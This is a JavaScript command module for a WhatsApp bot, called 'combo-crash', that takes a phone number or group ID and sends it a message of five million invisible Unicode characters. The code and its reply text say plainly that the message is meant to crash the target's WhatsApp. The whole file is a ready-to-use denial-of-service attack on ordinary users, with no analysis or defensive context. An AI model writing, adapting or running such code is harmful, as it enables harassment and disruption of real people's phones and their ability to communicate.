export default {
  name: "combo-crash",
  description: "Send invisible Unicode payload to crash target",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?combo-crash <number/group>\n\nExample:\n?combo-crash 234XXXXXXXXXX\n?combo-crash 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing combo-crash on target: ${target}`);

      // Generate invisible Unicode payload
      const payload = ["\u200B","\u200C","\u200D","\u200E","\u200F"].join("").repeat(1_000_000);

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 Combo crash payload sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] Combo-crash command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send combo crash: " + error.message
      });
    }
  }
};